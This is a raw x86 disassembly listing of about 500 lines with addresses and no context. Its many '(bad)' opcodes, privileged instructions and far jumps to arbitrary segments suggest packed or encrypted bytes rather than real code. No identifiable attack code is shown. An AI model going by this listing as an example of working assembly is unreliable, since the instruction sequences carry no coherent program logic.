  416efb:	dec    BYTE PTR [eax+0x6c]
  416efe:	aas    
  416eff:	cs popf 
  416f01:	lahf   
  416f02:	enter  0x70f2,0x22
  416f06:	mov    al,ds:0x8acd757a
  416f0b:	sbb    ah,ch
  416f0d:	adc    ecx,ebx
  416f0f:	nop
  416f10:	and    al,0xe1
  416f12:	add    ecx,eax
  416f14:	ins    BYTE PTR es:[edi],dx
  416f15:	(bad)
  416f19:	stc    
  416f1a:	push   0x56
  416f1c:	adc    DWORD PTR [ecx-0x16c075fc],esi
  416f22:	fcomp  DWORD PTR [eax+ebp*1]
  416f25:	xchg   edx,eax
  416f26:	adc    DWORD PTR [ecx+0x34fd60d2],ebx
  416f2c:	xchg   edx,eax
  416f2d:	sub    al,0x1a
  416f2f:	mov    ecx,0x5744e9d9
  416f34:	pop    ebx
  416f35:	imul   DWORD PTR [edi+eiz*4-0x295f9439]
  416f3c:	cld    
  416f3d:	cmp    eax,DWORD PTR [edx]
  416f3f:	mov    cl,BYTE PTR [ecx+ebx*4-0x60ec7e61]
  416f46:	cli    
  416f47:	inc    ebp
  416f48:	cmp    BYTE PTR [ecx],0xff
  416f4b:	mov    edi,0x1588e74c
  416f50:	adc    ah,BYTE PTR [esi]
  416f52:	js     0x416fc9
  416f54:	int3   
  416f55:	or     eax,0xdcb58071
  416f5a:	sub    al,0x7e
  416f5c:	cld    
  416f5d:	(bad)  
  416f5e:	mov    ecx,0xc015824f
  416f63:	addr16 fs xchg edi,eax
  416f66:	repz inc esp
  416f68:	hlt    
  416f69:	mov    ds:0x8d5cec16,al
  416f6e:	push   eax
  416f6f:	push   ebp
  416f70:	push   0x11
  416f72:	int3   
  416f73:	xlat   BYTE PTR ds:[ebx]
  416f74:	sahf   
  416f75:	fcomp  QWORD PTR [ebp-0x318aeccd]
  416f7b:	pop    ebx
  416f7c:	and    dh,BYTE PTR [esi-0x714644ae]
  416f82:	idiv   ecx
  416f84:	add    BYTE PTR [esi-0x5d],dl
  416f87:	sbb    ah,BYTE PTR [edi+ecx*1+0x3c37286e]
  416f8e:	and    BYTE PTR [ebx],ch
  416f90:	call   0x1915:0x47d82cf0
  416f97:	fdivr  DWORD PTR [edx-0x1f]
  416f9a:	mov    es,ebx
  416f9c:	(bad)  
  416f9d:	lods   eax,DWORD PTR ds:[esi]
  416f9e:	mov    eax,0x5e759e9d
  416fa3:	out    dx,eax
  416fa4:	inc    esp
  416fa5:	mov    BYTE PTR [ebx-0x68],dh
  416fa8:	mov    bl,0xee
  416faa:	outs   dx,BYTE PTR ds:[esi]
  416fab:	inc    ebx
  416fac:	xor    esp,esi
  416fae:	inc    edx
  416faf:	test   BYTE PTR [esi+0xf2c40ff],bh
  416fb5:	xor    eax,0xdde13e41
  416fba:	mov    ds:0x56e3bbac,al
  416fbf:	popf   
  416fc0:	(bad)  
  416fc1:	sahf   
  416fc2:	les    esi,FWORD PTR [esi+0x57f3a422]
  416fc8:	in     al,0xe0
  416fca:	xlat   BYTE PTR ds:[ebx]
  416fcb:	rcl    ebp,1
  416fcd:	mov    dl,0xcb
  416fcf:	pop    esi
  416fd0:	scas   al,BYTE PTR es:[edi]
  416fd1:	aad    0xbd
  416fd3:	ror    dl,0x63
  416fd6:	sbb    BYTE PTR [edx+edx*1+0x7895926e],0x9f
  416fde:	xchg   DWORD PTR [eax-0x25f1881c],eax
  416fe4:	inc    esi
  416fe5:	(bad)  
  416fe6:	scas   al,BYTE PTR es:[edi]
  416fe7:	(bad)  
  416fe8:	rcl    al,1
  416fea:	xor    dl,dl
  416fec:	jbe    0x416fa0
  416fee:	cld    
  416fef:	pusha  
  416ff0:	mov    WORD PTR [edx-0x57],es
  416ff3:	call   0xb406afa0
  416ff8:	fcmovnb st,st(5)
  416ffa:	popf   
  416ffb:	rcr    BYTE PTR [edi+0x9ecfbe],1
  417001:	mov    al,BYTE PTR [ebx]
  417003:	dec    eax
  417004:	pop    DWORD PTR [ebx]
  417006:	push   ecx
  417007:	mov    cl,0x76
  417009:	cmp    ecx,DWORD PTR [ebp+0x2c]
  41700c:	xchg   ebp,eax
  41700d:	dec    esi
  41700e:	jae    0x416fbf
  417010:	mov    esi,0x819c4018
  417015:	dec    dx
  417017:	cli    
  417018:	test   DWORD PTR [ebp-0x141fa608],eax
  41701e:	jg     0x416ff8
  417020:	push   0x9f7f4d3a
  417025:	ror    DWORD PTR [edi-0x76],cl
  417028:	fidiv  WORD PTR [ebp+0x67]
  41702b:	imul   DWORD PTR [esp+edi*4+0xe5091b7]
  417032:	jg     0x416ffc
  417034:	jns    0x417082
  417036:	ret    0x993b
  417039:	imul   edx,DWORD PTR [esp+ebp*2-0x4a],0xe1cb1c01
  417041:	js     0x417030
  417043:	int3   
  417044:	in     eax,0x50
  417046:	lods   eax,DWORD PTR ds:[esi]
  417047:	dec    eax
  417048:	push   0xa2fa650c
  41704d:	shl    DWORD PTR [edi-0x33b3800c],1
  417053:	(bad)  
  417054:	cwde   
  417055:	sbb    edx,0xffffffe4
  417058:	mov    ecx,0x6c22dd57
  41705d:	mov    esi,0x4b66bf46
  417062:	je     0x4170b7
  417064:	leave  
  417065:	in     al,0xcd
  417067:	ja     0x41703f
  417069:	test   DWORD PTR [ebx],edi
  41706b:	pop    eax
  41706c:	sbb    DWORD PTR [edi+0x26],ecx
  41706f:	sbb    BYTE PTR [eax-0xc846a90],al
  417075:	bound  edi,QWORD PTR [esi-0x1c]
  417078:	or     BYTE PTR [edi],al
  41707a:	or     bl,BYTE PTR [edx-0x6fc49298]
  417080:	jnp    0x41706f
  417082:	jge    0x417067
  417084:	out    dx,al
  417085:	mov    dh,0xef
  417087:	sbb    DWORD PTR [ecx+edx*2-0x2aaba473],ebx
  41708e:	adc    BYTE PTR [edi],dl
  417090:	call   0x8463:0xae5e1293
  417097:	jmp    0x5a07cc4b
  41709c:	rcl    ah,1
  41709e:	addr16 mov esi,0xcb746fac
  4170a4:	sub    al,0xc
  4170a6:	pop    edx
  4170a7:	mov    bl,0x60
  4170a9:	in     al,dx
  4170aa:	addr16 pop ss
  4170ac:	mov    eax,0xf4c8c5c8
  4170b1:	lods   eax,DWORD PTR ds:[esi]
  4170b2:	adc    ecx,DWORD PTR [ebx]
  4170b4:	hlt    
  4170b5:	and    ch,BYTE PTR [esi-0x29bd5043]
  4170bb:	add    al,0x29
  4170bd:	popf   
  4170be:	dec    edi
  4170bf:	cs aaa 
  4170c1:	fdivrp st(6),st
  4170c3:	mov    BYTE PTR [ebp+esi*8-0x42],ch
  4170c7:	scas   al,BYTE PTR es:[edi]
  4170c8:	mov    ch,ah
  4170ca:	pop    ebx
  4170cb:	dec    esp
  4170cc:	aaa    
  4170cd:	and    eax,0xfb498ef9
  4170d2:	loope  0x41706a
  4170d4:	retf   0x5f97
  4170d7:	dec    esp
  4170d8:	shl    BYTE PTR [ebp+0x11],0x15
  4170dc:	(bad)  
  4170dd:	lock and cl,BYTE PTR [ebx-0x79adbfdd]
  4170e4:	hlt    
  4170e5:	inc    esp
  4170e6:	aam    0xe7
  4170e8:	sbb    bh,BYTE PTR [edi+0xa]
  4170eb:	fsub   DWORD PTR [edi]
  4170ed:	mov    ch,0xa
  4170ef:	add    DWORD PTR [eax+0x5f59f734],edx
  4170f5:	pushf  
  4170f6:	cmp    esi,esp
  4170f8:	xchg   BYTE PTR [edx-0x7a58c074],bh
  4170fe:	mov    bl,BYTE PTR [ebx+0x411e8bf0]
  417104:	inc    ebx
  417105:	mov    ds:0xaf238242,al
  41710a:	cmp    esi,DWORD PTR [esi+0x75]
  41710d:	dec    ecx
  41710e:	mov    dl,0x82
  417110:	add    BYTE PTR gs:0xcfb4b128,al
  417117:	mov    ebx,0xdd8ecdf3
  41711c:	fbstp  TBYTE PTR [esi]
  41711e:	push   es
  41711f:	(bad)  
  417120:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417121:	cmp    edi,esi
  417123:	lahf   
  417124:	pushf  
  417125:	hlt    
  417126:	mov    bh,0xc6
  417128:	icebp  
  417129:	push   esp
  41712a:	neg    DWORD PTR [edi-0x10]
  41712d:	add    edx,DWORD PTR [edi-0x40]
  417130:	mov    esp,0xb73120e0
  417135:	(bad)  
  417136:	add    al,BYTE PTR [eax+edi*1-0x5a]
  41713a:	in     eax,0x96
  41713c:	sub    DWORD PTR [ebx+ebp*8],ecx
  41713f:	mov    al,0xe5
  417141:	xor    bl,cl
  417143:	jmp    0x41717c
  417145:	subps  xmm2,xmm4
  417148:	cmp    bl,cl
  41714a:	pop    esi
  41714b:	loopne 0x41711b
  41714d:	inc    ebx
  41714e:	shl    DWORD PTR [esi-0x6a5ae817],0x87
  417155:	add    DWORD PTR [eax-0x11f2a7e0],esp
  41715b:	retf   0x2d82
  41715e:	mov    eax,DWORD PTR [ebx+0x20]
  417161:	xor    DWORD PTR [esi],edx
  417163:	(bad)  
  417164:	mov    ah,0xa0
  417166:	xchg   ebx,eax
  417167:	and    eax,0xdcc6d392
  41716c:	lds    ebp,FWORD PTR [edi+eax*1]
  41716f:	pushf  
  417170:	loope  0x417139
  417172:	add    BYTE PTR [ecx-0x770b290d],0xad
  417179:	push   ebp
  41717a:	push   ebp
  41717b:	repnz das 
  41717d:	lea    eax,[ebx+0x2a]
  417180:	and    eax,DWORD PTR [ebx+edi*2+0x625d6fa8]
  417187:	xchg   ecx,eax
  417188:	pop    ebx
  417189:	ins    DWORD PTR es:[edi],dx
  41718a:	shr    DWORD PTR [edx],cl
  41718c:	sbb    al,0xf4
  41718e:	cmp    ebp,ebp
  417190:	inc    ebp
  417191:	inc    ebp
  417192:	addr16 mov eax,0x62e6c89d
  417198:	fstp   st(7)
  41719a:	add    eax,edx
  41719c:	xor    eax,0xd0034e6d
  4171a1:	mov    gs,WORD PTR ds:0xb8ab54aa
  4171a7:	out    0x54,eax
  4171a9:	aam    0xf2
  4171ab:	fstp   QWORD PTR [ebp+0x362bafac]
  4171b1:	jl     0x4171db
  4171b3:	jmp    0x3ea5:0xf0a547bb
  4171ba:	rcr    DWORD PTR [esi+ecx*1-0x55],0x7
  4171bf:	(bad)  
  4171c0:	in     al,dx
  4171c1:	mov    edx,0xc6d1be3a
  4171c6:	mov    fs,eax
  4171c8:	in     eax,dx
  4171c9:	sbb    BYTE PTR [ebx-0x63],al
  4171cc:	jle    0x417210
  4171ce:	pop    ecx
  4171cf:	pusha  
  4171d0:	ret    0xde10
  4171d3:	js     0x41719c
  4171d5:	pop    esi
  4171d6:	dec    ebx
  4171d7:	nop
  4171d8:	iret   
  4171d9:	je     0x41723e
  4171db:	(bad)  
  4171dc:	jbe    0x417215
  4171de:	std    
  4171df:	push   edx
  4171e0:	out    0x87,al
  4171e2:	xchg   DWORD PTR gs:[eax+ebx*1+0x8d059c8],edi
  4171ea:	or     al,0x8
  4171ec:	lods   al,BYTE PTR ds:[esi]
  4171ed:	mov    ch,0x54
  4171ef:	xchg   ecx,eax
  4171f0:	cld    
  4171f1:	pop    dx
  4171f3:	pop    edx
  4171f4:	scas   al,BYTE PTR es:[edi]
  4171f5:	push   ss
  4171f6:	cli    
  4171f7:	pop    edx
  4171f8:	out    dx,eax
  4171f9:	and    dl,BYTE PTR [edx+0x72]
  4171fc:	gs in  al,0x8
  4171ff:	jno    0x417262
  417201:	sub    BYTE PTR [edx+edx*1-0x77d1f1e1],cl
  417208:	mov    dl,0xe0
  41720a:	mov    ebx,0xba078652
  41720f:	mov    ds:0x55d8997d,eax
  417214:	add    eax,0x35beee40
  417219:	jns    0x417246
  41721b:	fwait
  41721c:	mov    cl,0x1a
  41721e:	add    dh,BYTE PTR [esi]
  417220:	pop    ebx
  417221:	inc    ebx
  417222:	pop    ebx
  417223:	std    
  417224:	xchg   ebp,eax
  417225:	dec    esi
  417226:	pop    ds
  417227:	mov    WORD PTR [edx-0x18aec69b],fs
  41722d:	fs cwde 
  41722f:	mov    ch,0x83
  417231:	test   al,0xce
  417233:	fbstp  TBYTE PTR [edx+edi*8+0x4b4e473f]
  41723a:	push   esp
  41723b:	fsub   QWORD PTR [ebx]
  41723d:	adc    eax,0x1f21b03e
  417242:	cli    
  417243:	test   DWORD PTR [esi],esp
  417245:	bound  esi,QWORD PTR [esi]
  417247:	or     esp,DWORD PTR [edi-0x64feeb1b]
  41724d:	cmp    cl,BYTE PTR [eax+0x1d]
  417250:	(bad)  
  417252:	loope  0x41723d
  417254:	rcr    DWORD PTR [edi+0x21],0xc9
  417258:	push   0x1ef3b177
  41725d:	adc    DWORD PTR [edi+0x31],ebx
  417260:	shl    DWORD PTR ds:0x4d8d8202,cl
  417266:	cli    
  417267:	xor    eax,ebp
  417269:	dec    ecx
  41726a:	ret    
  41726b:	test   DWORD PTR [esi],edx
  41726d:	test   DWORD PTR [eax-0x747f918d],esi
  417273:	lds    esi,FWORD PTR [ebp+0x61887e19]
  417279:	std    
  41727a:	cmp    DWORD PTR [edi],esp
  41727c:	retf   
  41727d:	or     DWORD PTR [esi-0x1e],edi
  417280:	mov    dh,0x26
  417282:	loop   0x4172fe
  417284:	mov    edi,0xc82add04
  417289:	rol    DWORD PTR [ecx+ebx*8],1
  41728c:	popf   
  41728d:	mov    ebx,0xcf76971e
  417292:	ret    0x4443
  417295:	mov    BYTE PTR [ecx-0x21],bl
  417298:	out    dx,eax
  417299:	pop    eax
  41729a:	or     eax,DWORD PTR [eax+0x22]
  41729d:	pop    eax
  41729e:	ss fcmovbe st,st(1)
  4172a1:	inc    eax
  4172a2:	dec    edi
  4172a3:	mov    cl,0xcf
  4172a5:	push   ss
  4172a6:	(bad)  
  4172a8:	sbb    DWORD PTR [ecx],eax
  4172aa:	push   esi
  4172ab:	dec    esp
  4172ac:	stos   BYTE PTR es:[edi],al
  4172ad:	imul   esp,ebx,0xaf4570e1
  4172b3:	push   es
  4172b4:	adc    al,0xe1
  4172b6:	inc    edi
  4172b7:	xor    DWORD PTR [edx],esp
  4172b9:	mov    DWORD PTR [edx+ebx*1+0x44a852bf],edi
  4172c0:	mov    WORD PTR [edx],?
  4172c2:	pop    edi
  4172c3:	xlat   BYTE PTR ds:[ebx]
  4172c4:	(bad)  
  4172c5:	leave  
  4172c6:	jo     0x417313
  4172c8:	iret   
  4172c9:	cdq    
  4172ca:	fadd   st,st(6)
  4172cc:	and    eax,0x57042277
  4172d1:	inc    esp
  4172d2:	(bad)  [edi-0x1ffb0f4c]
  4172d8:	sub    esi,ebx
  4172da:	and    bh,BYTE PTR ds:0x198f0e5
  4172e0:	scas   eax,DWORD PTR es:[edi]
  4172e1:	adc    DWORD PTR [edx],ebp
  4172e3:	mov    esi,0x21b81f70
  4172e8:	jnp    0x4172b8
  4172ea:	adc    ebx,DWORD PTR [ebp+0x1fe8ecf8]
  4172f0:	int    0xd3
  4172f2:	outs   dx,BYTE PTR es:[esi]
  4172f4:	inc    ecx
  4172f5:	push   ebx
  4172f6:	imul   eax,DWORD PTR [eax],0x2e
  4172f9:	sbb    eax,0xbc048e93
  4172fe:	sahf   
  4172ff:	dec    esp
  417300:	sbb    BYTE PTR [esi],cl
  417302:	aad    0x10
  417304:	sbb    BYTE PTR [ebp+0x57],dl
  417307:	(bad)  
  417308:	jmp    0x4172a1
  41730a:	cmp    bh,ch
  41730c:	std    
  41730d:	mov    edx,edx
  41730f:	push   esi
  417310:	add    al,al
  417312:	push   ebx
  417313:	enter  0x30b,0x76
  417317:	push   ebp
  417318:	jp     0x41736b
  41731a:	gs mov ch,BYTE PTR es:[ecx]
  41731e:	dec    esi
  41731f:	ret    
  417320:	clc    
  417321:	xor    DWORD PTR [eax+0x60],esi
  417324:	xchg   ecx,eax
  417325:	ret    
  417326:	mov    ch,0x14
  417328:	adc    eax,0xb99d37b7
  41732e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41732f:	cmp    al,0x2f
  417331:	lea    ecx,es:[esi-0x22e69817]
  417338:	and    eax,edi
  41733a:	pop    esp
  41733b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41733c:	mov    dh,0x49
  41733e:	sub    edi,eax
  417340:	clc    
  417341:	shl    DWORD PTR [esi+ebx*2-0x6103b144],1
  417348:	xchg   esp,eax
  417349:	jns    0x41736b
  41734b:	mov    DWORD PTR [esi-0x4f],ecx
  41734e:	cmc    
  41734f:	add    bl,BYTE PTR [ebp+0x10]
  417352:	dec    esi
  417353:	outs   dx,DWORD PTR ds:[esi]
  417354:	call   0xf41bde10
  417359:	sub    esi,DWORD PTR [ecx]
  41735b:	repnz xor DWORD PTR [ecx],eax
  41735e:	(bad)  
  41735f:	push   eax
  417360:	dec    edi
  417361:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417362:	inc    eax
  417363:	xlat   BYTE PTR ds:[ebx]
  417364:	jnp    0x417353
  417366:	inc    edi
  417367:	popf   
  417368:	adc    esp,0x47
  41736b:	dec    esp
  41736c:	loopne 0x417393
  41736e:	je     0x4173d8
  417370:	jne    0x4173e0
  417372:	adc    eax,0xdcf1abf7
  417377:	jp     0x4173af
  417379:	inc    ebx
  41737a:	int    0xeb
  41737c:	mov    dh,0x1a
  41737e:	jmp    0x7cb6:0xd848afd
  417385:	adc    BYTE PTR [edi],ah
  417387:	or     eax,ebx
  417389:	cmp    al,BYTE PTR [esi]
  41738b:	clc    
  41738c:	or     bh,al
  41738e:	nop
  41738f:	push   esp
  417390:	jmp    0x417384
  417392:	fwait
  417393:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417394:	mov    ah,BYTE PTR [edx-0x5b]
  417397:	mov    bh,BYTE PTR [edi-0x644599b9]
  41739d:	popf   
  41739e:	mov    ebx,DWORD PTR [esp+ebp*1-0x33]
  4173a2:	sub    DWORD PTR [esi-0x6f],edx
  4173a5:	retf   
  4173a6:	xchg   DWORD PTR [eax+0x538f0184],ebx
  4173ac:	push   ds
  4173ad:	rcl    BYTE PTR [ebp+0x4e],1
  4173b0:	bound  ebp,QWORD PTR ss:[ebp+0x5229b568]
  4173b7:	or     ecx,ebp
  4173b9:	jg     0x4173c6
  4173bb:	test   eax,0xce64f78f
  4173c0:	pop    ss
  4173c1:	xchg   edx,eax
  4173c2:	push   ebp
  4173c3:	mov    dh,0x6d
  4173c5:	adc    DWORD PTR [eax],ebp
  4173c7:	pop    ds
  4173c8:	add    BYTE PTR [ecx-0x44],ch
  4173cb:	sar    BYTE PTR [eax+0x36020f65],1
  4173d1:	xor    eax,edi
  4173d3:	mov    eax,0x9e8bfc23
  4173d8:	cmp    BYTE PTR [bp+0x20],dl
  4173dc:	sbb    al,0xa4
  4173de:	push   ebp
  4173df:	add    DWORD PTR [ebp+0x4e],ebx
  4173e2:	push   eax
  4173e3:	push   0xffffffa6
  4173e5:	pop    ds
  4173e6:	shl    BYTE PTR ds:0xd1a37394,1
  4173ec:	mov    ebx,0xf947779c
  4173f1:	adc    DWORD PTR [ebp-0xa6dd61],0x6a
  4173f8:	sbb    eax,0xbb16271b
  4173fd:	cmc    
  4173fe:	icebp  
  4173ff:	out    dx,eax
  417400:	inc    edx
  417401:	out    dx,al
  417402:	dec    eax
  417403:	push   edi
  417404:	pop    eax
  417405:	mov    dl,0x6
  417407:	punpckldq mm3,DWORD PTR [ebx-0x69c44116]
  41740e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41740f:	cmp    ecx,0x1f
  417412:	dec    esp
  417413:	fs push esp
  417415:	push   cs
  417416:	fnstsw WORD PTR [ecx-0x37]
  417419:	sbb    ch,al
  41741b:	adc    ecx,DWORD PTR ds:0x1d1e1b3b
  417422:	fcmovnb st,st(1)
  417424:	or     DWORD PTR [esi-0x494c7e24],eax
  41742a:	lds    eax,FWORD PTR [ecx+0x45dfd05e]
  417430:	inc    eax
  417431:	fwait
  417432:	xchg   ecx,eax
  417433:	push   ecx
  417434:	jge    0x417448
  417436:	cli    
  417437:	xor    al,0x95
  417439:	daa    
  41743a:	lea    si,[edi]
  41743d:	dec    eax
  41743e:	push   cs
  41743f:	pushf  
  417440:	and    cl,BYTE PTR [esi+0x5f9f9697]
  417446:	xor    eax,0xa11decd4
  41744b:	pop    edx
  41744c:	sbb    esi,DWORD PTR [ebx+edi*8]
  41744f:	mov    ebp,0x187d8e7f
  417454:	leave  
  417455:	xor    DWORD PTR [edx+0x162898fa],0x49b23b
  41745f:	sbb    esp,ebx
  417461:	into   
  417462:	sar    bh,cl
  417464:	xchg   DWORD PTR [eax-0x4c],edx
  417467:	adc    bl,BYTE PTR [edx]
  417469:	add    al,BYTE PTR gs:[ebx+0x10]
  41746d:	ins    BYTE PTR es:[edi],dx
  41746e:	aam    0x5a
  417470:	sbb    DWORD PTR [ebp+0x5e],0xd421fa24
  417477:	mov    edi,0x739b0709
  41747c:	sbb    bh,cl
  41747e:	test   eax,0x4704637d
  417483:	inc    esp
  417484:	data16 aas 
  417486:	stc    
  417487:	sub    BYTE PTR [esi],ch
  417489:	dec    eax
  41748a:	cmc    
  41748b:	jmp    0x41747c
  41748d:	mov    bl,0x9b
  41748f:	(bad)  
  417490:	neg    BYTE PTR [edx-0x60]
  417493:	adc    BYTE PTR [edx+ecx*8-0xb],0x5
  417498:	int    0x76
  41749a:	mov    ds:0xba0bdc0c,al
  41749f:	in     al,0xc
  4174a1:	push   ecx
  4174a2:	or     eax,0xc95ec64f
  4174a7:	scas   al,BYTE PTR es:[edi]
  4174a8:	fwait
  4174a9:	(bad)  
  4174aa:	stos   BYTE PTR es:[edi],al
  4174ab:	inc    edx
  4174ac:	sbb    eax,0x8cf589e4
  4174b1:	sbb    DWORD PTR [ebx],ebp
  4174b3:	and    DWORD PTR [eax+0x3e27ead5],ebx
  4174b9:	out    dx,al
  4174ba:	inc    eax
  4174bb:	sub    DWORD PTR [eax],ecx
  4174bd:	inc    edx
  4174be:	xchg   ebx,eax
  4174bf:	call   0x489e:0x8d658ec7
  4174c6:	jmp    0xdd19:0x2de13883
  4174cd:	xchg   ebx,eax
  4174ce:	mov    ah,0x22
  4174d0:	arpl   WORD PTR [esi],ax
  4174d2:	loop   0x417510
  4174d4:	sbb    eax,DWORD PTR [ecx-0x70]
  4174d7:	or     BYTE PTR [ebx],cl
  4174d9:	push   edi
  4174da:	mov    BYTE PTR ss:[esi],ah
  4174dd:	xchg   esi,eax
  4174de:	mov    ebx,0xdafd2c3b
  4174e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174e4:	sub    BYTE PTR [esi-0x41a1622e],bl
  4174ea:	call   0x14cc:0xb673dd41
  4174f1:	scas   al,BYTE PTR es:[edi]
  4174f2:	pop    ds
  4174f3:	xchg   ebp,eax
  4174f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174f5:	leave  
  4174f6:	xor    BYTE PTR [eax+0x69],dl
  4174f9:	in     al,dx
  4174fa:	jae    0x417503
  4174fc:	push   ebx
  4174fd:	inc    ebp
  4174fe:	pop    esp
  4174ff:	jmp    0xf93f:0xddd636f4
  417506:	cwde   
  417507:	repz jl 0x4174dc
  41750a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41750b:	or     esp,edi
  41750d:	and    dl,0x6e
  417510:	jbe    0x4174e5
  417512:	ss cmp bl,ch
  417515:	jne    0x417536
  417517:	clc    
  417518:	sbb    eax,0xae2b78e8
  41751d:	push   ds
  41751e:	adc    BYTE PTR [edi-0x5b],al
  417521:	xchg   edx,eax
  417522:	jp     0x4175a2
  417524:	xlat   BYTE PTR ds:[ebx]
  417525:	pushf  
  417526:	cmp    DWORD PTR [edx],eax
  417528:	stos   DWORD PTR es:[edi],eax
  417529:	inc    edi
  41752a:	pop    eax
  41752b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41752c:	inc    eax
  41752d:	sahf   
  41752e:	cli    
  41752f:	std    
  417530:	or     BYTE PTR [eax],ch
  417532:	popf   
  417533:	leave  
  417534:	inc    ebx
  417535:	cmc    
  417536:	inc    ebp
  417537:	mov    edx,0xe12e80b4
  41753c:	clc    
  41753d:	mov    dh,0x48
  41753f:	push   ss
  417540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417541:	sbb    DWORD PTR [edx],edx
  417543:	mov    DWORD PTR [eax+0x1715001],edi
  417549:	loop   0x41753d
  41754b:	dec    ebp
  41754c:	xchg   cl,dl
  41754e:	cli    
  41754f:	bound  edi,QWORD PTR [edx]
  417551:	and    DWORD PTR [eax-0x4f231298],eax
  417557:	mov    dl,BYTE PTR [esi+esi*4]
  41755a:	dec    ecx
  41755b:	xchg   esp,eax
  41755c:	mov    ah,0x9d
  41755e:	dec    esi
  41755f:	mov    dl,0x44
  417561:	lds    edi,FWORD PTR [eax]
  417563:	arpl   WORD PTR [eax],bp
  417565:	sahf   
  417566:	xchg   edi,eax
  417567:	outs   dx,BYTE PTR ds:[esi]
  417568:	push   eax
  417569:	out    0x52,eax
  41756b:	sbb    al,ah
  41756d:	scas   eax,DWORD PTR es:[edi]
  41756e:	(bad)  
  41756f:	out    dx,al
  417570:	sub    dl,BYTE PTR [ebp-0x4bfed016]
  417576:	inc    edi
  417577:	test   eax,0x85f16a5d
  41757c:	pop    edx
  41757d:	mov    ebp,0xe85cebe6
  417582:	mov    cl,0x8d
  417584:	xor    ch,BYTE PTR [ebx+0x5de604b9]
  41758a:	std    
  41758b:	jns    0x4175dd
  41758d:	outs   dx,DWORD PTR ds:[esi]
  41758e:	add    ah,BYTE PTR [ebx]
  417590:	or     DWORD PTR [edi+ebp*2],eax
  417593:	in     eax,dx
  417594:	xchg   DWORD PTR [ebp-0x2f],ecx
  417597:	xchg   esi,eax
  417598:	imul   edx,edi,0x605c3d5a
  41759e:	lods   eax,DWORD PTR ds:[esi]
  41759f:	sub    esi,0x23
  4175a2:	rcr    DWORD PTR [edx+0x3735252b],0xba
  4175a9:	out    dx,al
  4175aa:	jge    0x41761c
  4175ac:	add    DWORD PTR [esi+0x38a1b934],esi
  4175b2:	adc    ecx,ecx
  4175b4:	ins    DWORD PTR es:[edi],dx
  4175b5:	(bad)  
  4175b7:	pop    ds
  4175b8:	fs or  eax,0x3a876ea8
  4175be:	mov    ch,0x97
  4175c0:	call   0x130f8cac
  4175c5:	cmp    DWORD PTR [ecx+0x5e9b92be],eax
  4175cb:	shr    BYTE PTR [esi-0x2d9c461d],cl
  4175d1:	inc    ebp
  4175d2:	repnz dec esi
  4175d4:	mov    DWORD PTR [esi-0xd],esp
  4175d7:	inc    edi
  4175d8:	fidiv  DWORD PTR [ecx+ebp*2]
  4175db:	dec    edi
  4175dc:	mov    dl,0x55
  4175de:	dec    ecx
  4175df:	in     al,dx
  4175e0:	enter  0x5c5f,0x37
  4175e4:	mov    dl,0x9c
  4175e6:	outs   dx,BYTE PTR ds:[esi]
  4175e7:	push   ebx
  4175e8:	push   ebx
  4175e9:	das    
  4175ea:	call   DWORD PTR ds:0x2e56781a
  4175f0:	push   ss
  4175f1:	pop    esi
  4175f2:	frstor [eax+0x46fe462]
  4175f8:	adc    BYTE PTR [ebp+0x3f],dl
  4175fb:	or     eax,0x8b53066f
  417600:	test   BYTE PTR [eax],dh
  417602:	xor    eax,0x5f776504
  417607:	inc    ebx
  417608:	sub    dl,bh
  41760a:	pusha  
  41760b:	xor    ecx,DWORD PTR [eax+0x32]
  41760e:	jmp    0xcd7c:0xd05cb450
  417615:	loope  0x4175cf
  417617:	inc    dh
  417619:	xor    eax,0xc1853797
  41761e:	stos   DWORD PTR es:[edi],eax
  41761f:	bnd jge 0x417627
  417622:	push   es
  417623:	pop    eax
  417624:	lds    ecx,FWORD PTR [eax]
  417626:	xor    BYTE PTR [edi+eax*1-0xf46284d],ch
  41762d:	pop    ebx
  41762e:	or     esp,DWORD PTR [esi]
  417630:	jnp    0x4175bb
  417632:	pop    esi
  417633:	test   al,0xb4
  417635:	xor    ah,BYTE PTR [ecx+0x4229c041]
  41763b:	jns    0x417621
  41763d:	push   edx
  41763e:	sub    esp,DWORD PTR [ebx]
  417640:	xor    dh,ch
  417642:	popa   
  417643:	ins    BYTE PTR es:[edi],dx
  417644:	shl    BYTE PTR [esi],1
  417646:	aaa    
  417647:	adc    BYTE PTR [ebx],bh
  417649:	mov    bh,0x13
  41764b:	sbb    ebx,DWORD PTR [ebx+eiz*1+0x229a10be]
  417652:	jo     0x41768b
  417654:	iret   
  417655:	leave  
  417656:	lds    edx,FWORD PTR [edi]
  417658:	push   ecx
  417659:	xor    ebp,esp
  41765b:	push   edi
  41765c:	nop
  41765d:	call   0x4ed5:0x665ff7f
  417664:	xlat   BYTE PTR fs:[ebx]
  417666:	sub    al,0xb7
  417668:	in     al,0xc8
  41766a:	add    al,0xfc
  41766c:	mov    edi,0x14091c08
  417671:	sbb    esi,edx
  417673:	pop    ebx
  417674:	sub    cl,BYTE PTR [edi]
  417676:	mov    ds:0x65395e54,eax
  41767b:	out    0x3c,al
  41767d:	sub    BYTE PTR [ebp+0x7f5d2250],dl
  417683:	dec    ebx
  417684:	test   eax,0xbb9a305b
  417689:	xlat   BYTE PTR ds:[ebx]
  41768a:	mov    ecx,0xf40b656a
  41768f:	dec    esp
  417690:	int3   
  417691:	int3   
  417692:	lods   al,BYTE PTR ds:[esi]
  417693:	mov    al,ds:0x2c5123fb
  417698:	inc    ecx
  417699:	xor    cl,cl
  41769b:	push   0x9357d6c2
  4176a0:	cmc    
  4176a1:	fistp  QWORD PTR [eax-0x4a29aa60]
  4176a7:	xchg   ebp,eax
  4176a8:	jno    0x417705
  4176aa:	cwde   
  4176ab:	push   0xffffff9a
  4176ad:	sbb    eax,0x20d2c835
  4176b2:	fidivr WORD PTR ds:0x7249e46b
  4176b8:	ins    DWORD PTR es:[edi],dx
  4176b9:	(bad)  
  4176bb:	test   edx,esi
